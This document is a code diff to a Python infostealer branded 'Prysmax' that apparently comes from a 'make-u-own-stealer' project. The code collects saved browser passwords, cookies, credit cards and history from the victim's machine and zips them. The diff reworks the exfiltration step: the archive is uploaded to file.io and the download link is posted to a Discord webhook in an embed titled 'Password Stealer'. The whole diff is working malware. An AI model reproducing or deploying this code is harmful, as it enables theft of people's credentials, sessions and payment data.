@@ -206,7 +206,7 @@ def installed_browsers():
     return results
 
 
-if __name__ == '__main__':
+def mainpass():
     available_browsers = installed_browsers()
 
     for browser in available_browsers:
@@ -214,23 +214,50 @@ if __name__ == '__main__':
         master_key = get_master_key(browser_path)
 
         save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
-
         save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
-
         save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
-
         save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
-
         save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
-        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')    
-try:
- os.remove(user+'\\AppData\\Local\\Temp\\Browser')
-except:
-    pass
-with open(user+'\\AppData\\Local\\Temp\\Browser.zip', "rb") as f:
- files = {"Browser.zip": (user+'\\AppData\\Local\\Temp\\Browser.zip', f)}
- r = requests.post(hook, files=files)
- try:
-     os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
- except:
-     pass
+        
+    shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
+    
+    try:
+        os.remove(user+'\\AppData\\Local\\Temp\\Browser')
+    except:
+        pass
+    files = {'file': open(user+'\\AppData\\Local\\Temp\\Browser.zip', 'rb')}
+    params = {'expire': 'never'}
+
+    response = requests.post("https://file.io", files=files, params=params).json()
+    todo = {
+    "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
+    "username": "Prysmax",
+    "embeds": [
+        {
+            "title": "Password Stealer",
+            "fields": [
+                {
+                    "name": "Download Link",
+                    "value": f"`{response['link']}`",
+                    "inline": True
+                },
+                {
+                    "name": "Files:",
+                    "value": f"`{total_browsers}`",
+                    "inline": True
+                }
+            ],
+            "image": {
+                "url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax_banner.gif",
+                "height": 0,
+                "width": 0
+            }
+        }
+    ]
+    }
+    r = requests.post(hookTy, json=todo)
+                
+    try:
+        os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
+    except:
+        pass
